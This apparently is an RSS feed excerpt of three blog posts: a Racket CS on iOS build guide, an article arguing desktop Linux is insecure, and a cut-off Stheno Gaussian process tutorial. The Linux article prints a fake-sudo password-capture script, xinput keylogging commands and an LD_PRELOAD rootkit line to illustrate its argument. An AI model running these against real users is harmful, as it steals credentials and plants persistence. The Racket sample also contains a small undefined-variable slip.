January 19, 2021 | https://defn.io/2021/01/19/racket-cs-on-ios/ | <a href="https://web.archive.org/web/*/https://defn.io/2021/01/19/racket-cs-on-ios/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
      <div>
        <div id="content">
          <article>
    
    

    
    <div>
      <p>A couple of weeks ago, I started working on getting Racket CS to
compile and run on iOS and, with a lot of guidance from Matthew Flatt,
I managed to get it working (with some <a href="https://github.com/racket/racket/blob/351c0047d6371e36cf422b4627e020d14e8853fe/racket/src/ChezScheme/c/segment.c#L578-L587">caveats</a>).  <a href="https://github.com/racket/racket/pull/3607">Those
changes</a> have now been merged, so I figured I’d write another <a href="https://defn.io/2020/01/05/racket-on-ios/">one
of these guides</a> while the information is still fresh in my head.</p>
<h2 id="compile-racket-for-macos-and-for-ios">Compile Racket for macOS and for iOS</h2>
<p>You need a recent version of Racket and it’s associated fork of Chez
Scheme built for your host machine in order to cross-compile things.
To build both of them, clone the <a href="https://github.com/racket/racket">Racket repository</a> and follow the
<a href="https://github.com/racket/racket/blob/08fa24304ebf80a21ade32e8e59bb51b27af1dae/build.md#1-building-racket-from-source">build instructions</a>.  If you use the default <code>make</code> target, then
you’ll end up with a host Racket installation overlayed on top of the
<code>racket/</code> directory in the repository and with a build of Chez Scheme
at <code>racket/src/build/cs/c/</code>.</p>
<p>Next, you can cross-compile Racket CS for iOS by making a new build
directory within <code>racket/src/</code> and configuring a cross build by
specifying a custom prefix (so that the <code>make install</code> step won’t
overwrite the host Racket installation), the target <code>host</code>
architecture, a path to the iOS SDK (or the shorthand name “iPhoneOS”)
and the paths to the host Racket and Chez Scheme.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span></code></pre></td>
<td>
<pre><code data-lang="bash">mkdir racket/src/build-ios <span>\
</span><span></span>  <span>&amp;&amp;</span> <span>cd</span> racket/src/build-ios <span>\
</span><span></span>  <span>&amp;&amp;</span> ../configure <span>\
</span><span></span>    --prefix<span>=</span><span>"</span><span>$(</span><span>pwd</span><span>)</span><span>/../../../racket-ios"</span> <span>\
</span><span></span>    --enable-macprefix <span>\
</span><span></span>    --host<span>=</span>aarch64-apple-darwin <span>\
</span><span></span>    --enable-ios<span>=</span>iPhoneOS <span>\
</span><span></span>    --enable-racket<span>=</span><span>"</span><span>$(</span><span>pwd</span><span>)</span><span>/../../bin/racket"</span> <span>\
</span><span></span>    --enable-scheme<span>=</span><span>"</span><span>$(</span><span>pwd</span><span>)</span><span>/../build/cs/c"</span> <span>\
</span><span></span>  <span>&amp;&amp;</span> make <span>\
</span><span></span>  <span>&amp;&amp;</span> make install
</code></pre></td></tr></tbody></table>
</div>
</div><p>After running the above series of commands, you should end up with a
cross-compiled Racket installation at <code>racket-ios/</code> inside the source
repository.</p>
<h2 id="cross-compile-racket-modules-for-ios">Cross-compile Racket modules for iOS</h2>
<p>I added a section on <a href="https://www.cs.utah.edu/plt/snapshots/current/doc/inside/ios-cross-compilation.html?q=inside">how to cross-compile Racket
modules</a> to the “Inside Racket” docs so refer to that.
In short, if you save the following module under <code>app.rkt</code> somewhere</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span></code></pre></td>
<td>
<pre><code data-lang="racket"><span>#lang </span><span>racket/base</span>

<span>(</span><span>provide</span> <span>echo</span><span>)</span>

<span>(</span><span>define</span> <span>(</span><span>echo</span> <span>m</span><span>)</span>
  <span>(</span><span>displayln</span> <span>m</span><span>))</span><span>
</span></code></pre></td></tr></tbody></table>
</div>
</div><p>then you can run</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span><span>9
</span></code></pre></td>
<td>
<pre><code data-lang="bash">/path/to/racket/bin/racket <span>\
</span><span></span>  --compile-any <span>\
</span><span></span>  --compiled <span>'compiled_host:tarm64osx'</span> <span>\
</span><span></span>  --cross <span>\
</span><span></span>  --cross-compiler tarm64osx /path/to/racket/racket-ios/lib <span>\
</span><span></span>  --config /path/to/racket/racket-ios/etc <span>\
</span><span></span>  --collects /path/to/racket/racket-ios/collects <span>\
</span><span></span>  -l- <span>\
</span><span></span>  raco ctool --mods app.zo app.rkt
</code></pre></td></tr></tbody></table>
</div>
</div><p>to produce <code>app.zo</code>, a binary object containing the cross-compiled
code for that module and all of its dependencies.</p>
<h2 id="set-up-your-xcode-project">Set up your XCode project</h2>
<p>To link against and use Racket CS within an XCode project, copy
<code>racketcs.h</code>, <code>racketcsboot.h</code> and <code>chezscheme.h</code> from
<code>racket-ios/include/</code> into a sub-directory of your project, then add
that sub-directory to the “Header Search Paths” section under your
project’s “Build Settings” tab.</p>
<p><img src="https://defn.io/img/racket-cs-on-ios-headers.png" alt="Headers"></p>
<p>Then, disable Bitcode from the same section.</p>
<p><img src="https://defn.io/img/racket-cs-on-ios-bitcode.png" alt="Bitcode"></p>
<p>Next, copy <code>libracketcs.a</code>, <code>petite.boot</code>, <code>scheme.boot</code> and
<code>racket.boot</code> from <code>racket-ios/lib</code> into a sub-directory of your
project called <code>vendor/</code> and drag-and-drop the <code>vendor/</code> directory
into your XCode project.  Then, instruct XCode to link <code>libracketcs.a</code>
and <code>libiconv.tbd</code> with your code from the “Build Phases” tab.  You’ll
have to add <code>libracketcs.a</code> to your project using the “Add Other…”
sub-menu.</p>
<p><img src="https://defn.io/img/racket-cs-on-ios-link.png" alt="Link"></p>
<p>Next, add a new C source file called <code>vendor.c</code> and answer “yes” if
prompted to create a bridging header for Swift.  I tend to re-name the
bridging header to plain <code>bridge.h</code> because I don’t like the name that
XCode generates by default.  If you do this, you’ll have to update the
“Objective-C Bridging Header” setting in your “Build Settings” tab.
From <code>bridge.h</code>, include <code>vendor.h</code> and inside <code>vendor.h</code> add
definitions for <code>racket_init</code> and <code>echo</code></p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span><span>9
</span></code></pre></td>
<td>
<pre><code data-lang="c"><span>#ifndef vendor_h
</span><span>#define vendor_h
</span><span></span>
<span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span><span></span>
<span>int</span> <span>racket_init</span><span>(</span><span>const</span> <span>char</span> <span>*</span><span>,</span> <span>const</span> <span>char</span> <span>*</span><span>,</span> <span>const</span> <span>char</span> <span>*</span><span>,</span> <span>const</span> <span>char</span> <span>*</span><span>);</span>
<span>void</span> <span>echo</span><span>(</span><span>const</span> <span>char</span> <span>*</span><span>);</span>

<span>#endif
</span></code></pre></td></tr></tbody></table>
</div>
</div><p>then, inside of <code>vendor.c</code>, implement them</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span><span>15
</span><span>16
</span><span>17
</span><span>18
</span><span>19
</span><span>20
</span><span>21
</span><span>22
</span><span>23
</span><span>24
</span><span>25
</span><span>26
</span><span>27
</span><span>28
</span><span>29
</span><span>30
</span><span>31
</span><span>32
</span></code></pre></td>
<td>
<pre><code data-lang="c"><span>#include</span> <span>&lt;string.h&gt;</span><span>
</span><span></span>
<span>#include</span> <span>"chezscheme.h"</span><span>
</span><span>#include</span> <span>"racketcs.h"</span><span>
</span><span></span>
<span>#include</span> <span>"vendor.h"</span><span>
</span><span></span>
<span>int</span> <span>racket_init</span><span>(</span><span>const</span> <span>char</span> <span>*</span><span>petite_path</span><span>,</span>
                <span>const</span> <span>char</span> <span>*</span><span>scheme_path</span><span>,</span>
                <span>const</span> <span>char</span> <span>*</span><span>racket_path</span><span>,</span>
                <span>const</span> <span>char</span> <span>*</span><span>app_path</span><span>)</span> <span>{</span>
    <span>racket_boot_arguments_t</span> <span>ba</span><span>;</span>
    <span>memset</span><span>(</span><span>&amp;</span><span>ba</span><span>,</span> <span>0</span><span>,</span> <span>sizeof</span><span>(</span><span>ba</span><span>));</span>
    <span>ba</span><span>.</span><span>boot1_path</span> <span>=</span> <span>petite_path</span><span>;</span>
    <span>ba</span><span>.</span><span>boot2_path</span> <span>=</span> <span>scheme_path</span><span>;</span>
    <span>ba</span><span>.</span><span>boot3_path</span> <span>=</span> <span>racket_path</span><span>;</span>
    <span>ba</span><span>.</span><span>exec_file</span> <span>=</span> <span>"example"</span><span>;</span>
    <span>racket_boot</span><span>(</span><span>&amp;</span><span>ba</span><span>);</span>
    <span>racket_embedded_load_file</span><span>(</span><span>app_path</span><span>,</span> <span>1</span><span>);</span>
    <span>ptr</span> <span>mod</span> <span>=</span> <span>Scons</span><span>(</span><span>Sstring_to_symbol</span><span>(</span><span>"quote"</span><span>),</span> <span>Scons</span><span>(</span><span>Sstring_to_symbol</span><span>(</span><span>"main"</span><span>),</span> <span>Snil</span><span>));</span>
    <span>racket_dynamic_require</span><span>(</span><span>mod</span><span>,</span> <span>Sfalse</span><span>);</span>
    <span>Sdeactivate_thread</span><span>();</span>
    <span>return</span> <span>0</span><span>;</span>
<span>}</span>

<span>void</span> <span>echo</span><span>(</span><span>const</span> <span>char</span> <span>*</span><span>message</span><span>)</span> <span>{</span>
    <span>Sactivate_thread</span><span>();</span>
    <span>ptr</span> <span>mod</span> <span>=</span> <span>Scons</span><span>(</span><span>Sstring_to_symbol</span><span>(</span><span>"quote"</span><span>),</span> <span>Scons</span><span>(</span><span>Sstring_to_symbol</span><span>(</span><span>"main"</span><span>),</span> <span>Snil</span><span>));</span>
    <span>ptr</span> <span>echo_fn</span> <span>=</span> <span>Scar</span><span>(</span><span>racket_dynamic_require</span><span>(</span><span>mod</span><span>,</span> <span>Sstring_to_symbol</span><span>(</span><span>"echo"</span><span>)));</span>
    <span>racket_apply</span><span>(</span><span>fn</span><span>,</span> <span>Scons</span><span>(</span><span>Sstring</span><span>(</span><span>message</span><span>),</span> <span>Snil</span><span>));</span>
    <span>Sdeactivate_thread</span><span>();</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>Take a look at the <a href="https://www.cs.utah.edu/plt/snapshots/current/doc/inside/cs.html?q=inside">Inside Racket CS</a> documentation for details on the
embedding interface of Racket CS.  The gist of <code>racket_init</code> is that
it takes the paths to <code>petite.boot</code>, <code>scheme.boot</code>, <code>racket.boot</code> and
<code>app.zo</code> as arguments in order to initialize Racket and then load the
<code>app.zo</code> module, which you can do from the <code>AppDelegate</code>’s
<code>application(_:didFinishLaunchingWithOptions:)</code> method:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span></code></pre></td>
<td>
<pre><code data-lang="swift"><span>let</span> <span>vendorPath</span> <span>=</span> <span>Bundle</span><span>.</span><span>main</span><span>.</span><span>resourcePath</span><span>!.</span><span>appending</span><span>(</span><span>"/vendor"</span><span>)</span>
<span>let</span> <span>ok</span> <span>=</span> <span>racket_init</span><span>(</span>
    <span>vendorPath</span><span>.</span><span>appending</span><span>(</span><span>"/petite.boot"</span><span>),</span>
    <span>vendorPath</span><span>.</span><span>appending</span><span>(</span><span>"/scheme.boot"</span><span>),</span>
    <span>vendorPath</span><span>.</span><span>appending</span><span>(</span><span>"/racket.boot"</span><span>),</span>
    <span>vendorPath</span><span>.</span><span>appending</span><span>(</span><span>"/app.zo"</span><span>))</span>
<span>if</span> <span>ok</span> <span>!=</span> <span>0</span> <span>{</span>
    <span>print</span><span>(</span><span>"failed to initialize racket"</span><span>)</span>
    <span>exit</span><span>(</span><span>1</span><span>)</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>Upon successful initialization, you should be able to call the Racket <code>echo</code>
function from Swift:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span></code></pre></td>
<td>
<pre><code data-lang="swift"><span>echo</span><span>(</span><span>"Hello from Racket!"</span><span>.</span><span>cString</span><span>(</span><span>using</span><span>:</span> <span>.</span><span>utf8</span><span>))</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>Compile and run the project on a device and you should see “Hello from
Racket!” get printed in your debug console.</p>
<h3 id="some-xcode-gotchas">Some XCode gotchas</h3>
<p>If you copy <code>vendor/</code> into your project instead of creating “folder
references” when you drag-and-drop it, then code signing may fail with
an ambiguous error.</p>
<p>Avoid using symbolic links for any of your resources (like the stuff
in <code>vendor/</code>).  Doing so makes copying the code over to the device
fail with a “security” error that doesn’t mention the root problem at
all.</p>
    </div>

    

  </article>
        </div>
        

  

  

      </div>
    </div></div>]]>
            </description>
            <link>https://defn.io/2021/01/19/racket-cs-on-ios/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25833004</guid>
            <pubDate>Tue, 19 Jan 2021 12:56:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux (In)Security]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25832770">thread link</a>) | @phantom_rehan
<br/>
January 19, 2021 | https://madaidans-insecurities.github.io/linux | <a href="https://web.archive.org/web/*/https://madaidans-insecurities.github.io/linux">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  

  <p><i><time datetime="2020-11-21">Last edited: November 21, 2020</time></i></p>

  <p>
    Linux being secure is a common misconception in the security and privacy realm. Linux is thought to be secure primarily
    because of its source model, popular usage in servers, small userbase and confusion about its security features. This
    article is intended to debunk these misunderstandings. Due to inevitable pedanticism, "Linux" in this article refers
    to a standard desktop Linux or GNU/Linux distribution.
  </p>

  <h2 id="sandboxing"><a href="#sandboxing">Sandboxing</a></h2>

  <div><p>
    There is no strong sandboxing in the standard Linux desktop. This means that all applications have access to each other’s data
    and can snoop on your personal information. Linux still follows the <a href="https://theinvisiblethings.blogspot.com/2010/08/ms-dos-security-model.html">MS-DOS security model</a> — any malicious
    application you install or an RCE vulnerability in a benevolent application can result in the attacker instantly gaining
    access to your data. </p><p>
    
    This is in contrast to other desktop operating systems such as macOS or Windows 10 which have already put considerable effort into
    sandboxing applications. macOS <a href="https://developer.apple.com/documentation/security/app_sandbox">requires that all applications
    are sandboxed</a>. Windows <a href="https://docs.microsoft.com/en-us/windows/uwp/security/intro-to-secure-windows-app-development#41-windows-app-model">
    automatically sandboxes UWP applications</a> and provides the <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-sandbox/windows-sandbox-overview">Windows Sandbox
    utility</a> for non-UWP applications.
  </p></div>

  <h3 id="flatpak"><a href="#flatpak">Flatpak</a></h3>

  <div><p>
    Flatpak aims to sandbox applications, but <a href="https://flatkill.org/">its sandboxing is very flawed</a>. It fully
    trusts the applications and allows them to specify their own policy. This means security is optional and apps can
    just choose not to be sufficiently sandboxed. </p><p>
    
    Flatpak's permissions are also far too broad to be meaningful. For example, many applications come with
    <code>filesystem=home</code> which is read-write access to the user's home directory, giving access to all of your
    personal files and allowing trivial escapes via writing to <code>~/.bashrc</code> or similar. </p><p>
    
    Another example of Flatpak's broad permissions is how it allows unfiltered access to the X11 socket, allowing easy
    escapes due to X11's lack of GUI isolation. Adding X11 sandboxing via a nested X11 server such as Xpra is easy but
    <a href="https://blogs.gnome.org/alexl/2015/02/17/first-fully-sandboxed-linux-desktop-app/">Flatpak developers refuse
    to acknowledge this and continue to claim, "X11 is impossible to secure"</a>. </p><p>
    
    Even more examples of this is how Flatpak gives full access to directories such as <code>/sys</code> or
    <code>/proc</code> (kernel interfaces known for information leaks). </p><p>
    
    <i>Another</i> example is how the seccomp filter <a href="https://github.com/flatpak/flatpak/blob/f687f6b2ebfe9bc69f59e42bb96475ca01f08548/common/flatpak-run.c#L2646-L2693">
    only blacklists ~20 syscalls</a> which still exposes significant kernel attack surface.
  </p></div>

  <h3 id="firejail"><a href="#firejail">Firejail</a></h3>

  <p>
    Firejail also aims to sandbox applications but is, again, uneffective. If anything, it worsens security by acting as a
    privilege escalation hole. Firejail requires being SUID root, meaning it executes with the privileges of the root user.
    This could be acceptable if Firejail followed good security practices but, unfortunately, they do not. Firejail has too
    large attack surface which has resulted in <a href="https://seclists.org/oss-sec/2017/q1/25">many</a> <a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=16191&amp;product_id=0&amp;version_id=0&amp;page=1">vulnerabilities</a>
    in the past. <a href="https://github.com/netblue30/firejail/issues/3046">There are more details in this thread</a>.
  </p>

  <h2 id="exploit-mitigations"><a href="#exploit-mitigations">Exploit Mitigations</a></h2>

  

  <ul>
    <li>
      <a href="https://en.wikipedia.org/wiki/Control-flow_integrity">Control-Flow Integrity</a> is an exploit mitigation that aims to prevent
      code reuse attacks like ROP or JOP. A large portion of vulnerabilities are exploited using these techniques due to mitigations like NX
      making older techniques obsolete. On Linux, CFI is practically non-existent outside of Chromium whereas
      Windows has their own coarse-grained, forward-edge CFI implementation, <a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a> (CFG) as well as <a href="https://techcommunity.microsoft.com/t5/windows-kernel-internals/understanding-hardware-enforced-stack-protection/ba-p/1247815">
      Intel CET shadow stacks for backward-edge protection</a>. While CFG is only coarse-grained, Microsoft are <a href="https://connormcgarr.github.io/examining-xfg/">working on making it more fine-grained</a>.
    </li>

    <li>
      A very basic exploit technique is simply to find a way to execute the attackers own malicious code either by loading
      a malicious library on disk or by dynamically modifying executable code in memory. Linux has yet to provide strong mitigations
      against this while Windows has <a href="https://blogs.windows.com/msedgedev/2017/02/23/mitigating-arbitrary-native-code-execution/">
      Arbitrary Code Guard and Code Integrity Guard</a> to enforce strict W^X and mitigate this avenue of attacks. SELinux does provide
      the <code>execmem</code> boolean, however this is rarely ever used. There is also the <a href="https://lore.kernel.org/lkml/1562410493-8661-1-git-send-email-s.mesoraca16@gmail.com/">S.A.R.A. LSM</a> but this is yet to
      be accepted upstream.
    </li>

    <li>
      One of the most common memory corruption vulnerabilities is <a href="https://en.wikipedia.org/wiki/Uninitialized_variable">
      uninitialized memory</a>. Windows <a href="https://msrc-blog.microsoft.com/2020/05/13/solving-uninitialized-stack-memory-on-windows/">
      uses InitAll</a> to automatically initialize stack variables to zero for the kernel and some user space code as well as <a href="https://msrc-blog.microsoft.com/2020/07/02/solving-uninitialized-kernel-pool-memory-on-windows/">safer APIs for the kernel pool</a>
      whereas the solution in Linux is... nothing. There are some mitigations for kernel memory specifically but this doesn't cover
      any user space code and good luck finding a mainstream distribution that actually enables them.
    </li>
  </ul>

  <h2 id="kernel"><a href="#kernel">Kernel</a></h2>

  <div><p>
    The kernel is also very lacking in security. It is a monolithic kernel, meaning it contains a colossal amount of code all within
    the most privileged part of the operating system. The kernel has huge attack surface and is constantly adding new and dangerous features.
    The Linux kernel is equivalent to running all user space code as root in PID 1. </p><p>
    
    One example of these features is <a href="https://lwn.net/Articles/740157/">eBPF</a>. In a nutshell, eBPF is a framework within the
    Linux kernel that allows <i>unprivileged</i> user space to execute arbitrary code within the kernel for increased performance. eBPF
    also includes a JIT compiler which is fundamentally a W^X violation and opens up the possibility of JIT spraying. The kernel does perform
    a number of checks on the code that is executed but even then, this feature <a href="https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html">has</a> <a href="https://nitter.net/spendergrsec/status/1244703091037024257">still</a> <a href="https://nitter.net/bleidl/status/943714277403357185">caused</a> <a href="https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/">numerous</a> <a href="https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification">security</a>
    <a href="https://haxx.in/blasty-vs-ebpf.c">vulnerabilities</a>. </p><p>
    
    Another example of these features is <a href="https://www.man7.org/linux/man-pages/man7/user_namespaces.7.html">user namespaces</a>.
    User namespaces allow unprivileged users to interact with lots of kernel code that is normally reserved for the root user. It adds a
    massive amount of networking, mount, etc. functionality as new attack surface. It has also been the cause of <a href="https://lists.archlinux.org/pipermail/arch-general/2017-February/043066.html">numerous</a> <a href="https://lists.archlinux.org/pipermail/arch-general/2017-February/043078.html">privilege</a> <a href="https://github.com/a13xp0p0v/kconfig-hardened-check#questions-and-answers">escalation</a>
    <a href="https://github.com/subgraph/oz/issues/11#issuecomment-163396758">vulnerabilities</a> which is why many distributions <a href="https://salsa.debian.org/kernel-team/linux/-/blob/master/debian/patches/debian/add-sysctl-to-disallow-unprivileged-CLONE_NEWUSER-by-default.patch">
    such as Debian</a> have started to restrict it by default. The endless stream of vulnerabilities
    arising from this feature shows no sign of stopping either even after years since its introduction. </p><p>
    
    The kernel is written entirely in a memory unsafe language and has hundreds of bugs, many being security vulnerabilities, <a href="https://events19.linuxfoundation.org/wp-content/uploads/2017/11/Syzbot-and-the-Tale-of-Thousand-Kernel-Bugs-Dmitry-Vyukov-Google.pdf">discovered
    each <i>month</i></a>. In fact, there are so many bugs being found in the kernel, developers can’t keep up which
    results in many of the bugs <a href="https://syzkaller.appspot.com/upstream">staying unfixed for a long time</a>.
    <a href="https://jon.oberheide.org/files/syscan12-exploitinglinux.pdf">The kernel is decades behind in exploit
    mitigations</a> and many kernel developers simply <a href="https://www.washingtonpost.com/sf/business/2015/11/05/net-of-insecurity-the-kernel-of-the-argument/">do not
    care enough</a>. </p><p>
    
    Other kernels such as the  Windows and macOS kernels are somewhat similar too in that they are also large and bloated monolithic kernels with huge
    attack surface but they at least realise that these issues exist and take further steps to mitigate them.
  </p></div>

  <h2 id="root"><a href="#root">The Non-Existent Boundary of Root</a></h2>

  <p>
    On ordinary desktops, <a href="https://www.whonix.org/wiki/Dev/Strong_Linux_User_Account_Isolation">a compromised non-root user account with access
    to <code>sudo</code> is almost equal to full root compromise</a> as there are too many ways for an attacker to retrieve the
    sudo password. Usually, the standard user is part of group <code>sudo</code> which makes this a massive issue and makes a
    sudo password security theater. For example, the attacker can exploit the plethora of keylogging opportunities such as <a href="https://theinvisiblethings.blogspot.com/2011/04/linux-security-circus-on-gui-isolation.html">Xorg’s lack of GUI
      isolation</a>, the <a href="https://www.openwall.com/lists/oss-security/2011/11/05/3">many infoleaks in
      <code>/proc</code></a>, using <a href="https://github.com/Aishou/wayland-keylogger"><code>LD_PRELOAD</code> to hook
      into every process</a> and so much more. Even if we mitigate every single way to log keystrokes, the attacker can
    just setup their own fake sudo program to grab the user password.
  </p>

  <h2 id="examples"><a href="#examples">Examples</a></h2>

  <p>
    This is all it takes to get your <code>sudo</code> password:
  </p>

  <pre><code>cat &lt;&lt;\EOF &gt; /tmp/sudo
#!/bin/bash
if [[ "${@}" = "" ]]; then
  /usr/bin/sudo
else
  read -s -r -p "[sudo] password for ${USER}: " password
  echo "${password}" &gt; /tmp/password
  echo -e "\nSorry, try again."
  /usr/bin/sudo ${@}
fi
EOF
chmod +x /tmp/sudo
export PATH="/tmp:${PATH}"</code></pre>

  <p>
    Or:
  </p>

  <pre><code>xinput list # find your keyboard ID
xinput test id # replace "id" with the ID from the above command</code></pre>

  <div><p>
    etc. </p><p>
    
    Now the attacker is just a <code>modprobe</code> away from full kernel privileges. </p><p>
    
    An attacker can also trivially setup a session-wide rootkit via <code>LD_PRELOAD</code> or similar variables:
  </p></div>

  <pre><code>echo "LD_PRELOAD=\"/path/to/malicious_library\"" &gt;&gt; ~/.bashrc</code></pre>

  <div><p>
    This technique is quite common and is used in the majority of user space rootkits. A few examples are <a href="https://github.com/chokepoint/azazel">azazel</a>, <a href="https://github.com/chokepoint/Jynx2">Jynx2</a>
    and <a href="https://www.intezer.com/blog/linux/hiddenwasp-malware-targeting-linux-systems/">HiddenWasp</a>. </p><p>
    
    These are just a few examples and they don't even require exploiting bugs.
  </p></div>

  <h2 id="distro-specific-issues"><a href="#distro-specific-issues">Distribution-Specific Issues</a></h2>

  <h3 id="debian"><a href="#debian">Debian, Ubuntu, RHEL, CentOS</a></h3>

  <div><p>
    Debian, among other distributions such as Ubuntu that freeze packages for a long time only ever backport security fixes
    that receive a CVE. However, this misses the majority of them. Most fixes do not receive CVEs because either the developer
    doesn’t care or because it’s not obvious whether or not a bug is exploitable at first. </p><p>
    
    Debian maintainers cannot analyze every single commit perfectly and backport every security fix. They have to rely on CVEs
    which people do not use properly. </p><p>
    
    For example, the Linux kernel is <a href="https://github.com/gregkh/presentation-cve-is-dead/blob/master/cve-linux-kernel.pdf">
    particularly</a>
    <a href="https://grsecurity.net/reports_of_cves_death_greatly_exaggerated">bad</a> at this. Even when there is a CVE for the
    issue, sometimes fixes still aren't backported such as in the Debian Chromium package which is <a href="https://forums.whonix.org/t/chromium-browser-for-kicksecure-discussions-not-whonix/10388/49">still affected by many severe
    and public vulnerabilities, some of which are even being exploited in the wild</a>.
  </p></div>

  <h2 id="hardening"><a href="#hardening">"But I harden my system!"</a></h2>

  <div><p>
    Standard system hardening is not enough to fix any of these massive architectural security issues. Restricting a few
    minor things is not going to fix this. Likewise, a few common security features distributions deploy by default is also
    not going to fix this. Just because your distribution enables a MAC framework without creating a strict policy and still
    running most processes unconfined, doesn't mean you can escape from these. </p><p>
    
    The hardening required for a …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://madaidans-insecurities.github.io/linux">https://madaidans-insecurities.github.io/linux</a></em></p>]]>
            </description>
            <link>https://madaidans-insecurities.github.io/linux</link>
            <guid isPermaLink="false">hacker-news-small-sites-25832770</guid>
            <pubDate>Tue, 19 Jan 2021 12:22:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linear Models from a Gaussian Process Point of View with Stheno and JAX]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25832657">thread link</a>) | @wesselb
<br/>
January 19, 2021 | https://invenia.github.io/blog/2021/01/19/linear-models-with-stheno-and-jax/ | <a href="https://web.archive.org/web/*/https://invenia.github.io/blog/2021/01/19/linear-models-with-stheno-and-jax/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>19 Jan 2021</span></p>
  <p><em>Cross-posted at <a href="https://wesselb.github.io/2021/01/19/linear-models-with-stheno-and-jax.html">wesselb.github.io</a>.</em></p>

<p>A linear model prescribes a linear relationship between inputs and outputs.
Linear models are amongst the simplest of models, but they are ubiquitous across science.
A linear model with Gaussian distributions on the coefficients forms one of the simplest instances of a <em><a href="https://en.wikipedia.org/wiki/Gaussian_process">Gaussian process</a></em>.
In this post, we will give a brief introduction to linear models from a Gaussian process point of view.
We will see how a linear model can be implemented with <em>Gaussian process probabilistic programming</em> using <a href="https://github.com/wesselb/stheno">Stheno</a>, and how this model can be used to denoise noisy observations.
(Disclosure: <a href="https://willtebbutt.github.io/">Will Tebbutt</a> and Wessel are the authors of Stheno;
Will maintains a <a href="https://github.com/willtebbutt/Stheno.jl">Julia version</a>.)
In short, <a href="https://en.wikipedia.org/wiki/Probabilistic_programming">probabilistic programming</a> is a programming paradigm that brings powerful probabilistic models to the comfort of your programming language, which often comes with tools to automatically perform inference (make predictions).
We will also use <a href="https://github.com/google/jax">JAX</a>’s just-in-time compiler to make our implementation extremely efficient.</p>

<h2 id="linear-models-from-a-gaussian-process-point-of-view">Linear Models from a Gaussian Process Point of View</h2>

<p>Consider a data set \((x_i, y_i)_{i=1}^n \subseteq \R \times \R\) consisting of \(n\) real-valued input–output pairs.
Suppose that we wish to estimate a linear relationship between the inputs and outputs:</p><p>

\[\label{eq:ax_b}
    y_i = a \cdot x_i + b + \e_i,\]

</p><p>where \(a\) is an unknown slope, \(b\) is an unknown offset, and \(\e_i\) is some error/noise associated with the observation \(y_i\).
To implement this model with Gaussian process probabilistic programming, we need to cast the problem into a <em>functional form</em>.
This means that we will assume that there is some underlying, random function \(y \colon \R \to \R\) such that the observations are evaluations of this function: \(y_i = y(x_i)\).
The model for the random function \(y\) will embody the structure of the linear model \eqref{eq:ax_b}.
This may sound hard, but it is not difficult at all.
We let the random function \(y\) be of the following form:</p><p>

\[\label{eq:ax_b_functional}
    y(x) = a(x) \cdot x + b(x) + \e(x)\]

</p><p>where \(a\colon \R \to \R\) is a <em>random constant function</em>.
An example of a <em>constant function</em> \(f\) is \(f(x) = 5\).
<em>Random</em> means that the value \(5\) is not fixed, but modelled with a random value drawn from some probability distribution, because we don’t know the true value.
We let \(b\colon \R \to \R\) also be a random <em>constant function</em>, and \(\e\colon \R \to \R\) a random <em>noise function</em>.
Do you see the similarities between \eqref{eq:ax_b} and \eqref{eq:ax_b_functional}?
If all that doesn’t fully make sense, don’t worry; things should become more clear as we implement the model.</p>

<p>To model random constant functions and random noise functions, we will use <a href="https://github.com/wesselb/stheno">Stheno</a>, which is a Python library for Gaussian process modelling.
We also have a <a href="https://github.com/willtebbutt/Stheno.jl">Julia version</a>, but in this post we’ll use the Python version.
To install Stheno, run the command</p>

<div><div><pre><code>pip <span>install</span> <span>--upgrade</span> <span>--upgrade-strategy</span> eager stheno
</code></pre></div></div>

<p>In Stheno, a Gaussian process can be created with <code>GP(kernel)</code>, where <code>kernel</code> is the so-called <a href="https://en.wikipedia.org/wiki/Gaussian_process#Covariance_functions"><em>kernel</em> or <em>covariance function</em> of the Gaussian process</a>.
The kernel determines the properties of the function that the Gaussian process models.
For example, the kernel <code>EQ()</code> models smooth functions, and the kernel <code>Matern12()</code> models functions that look jagged.
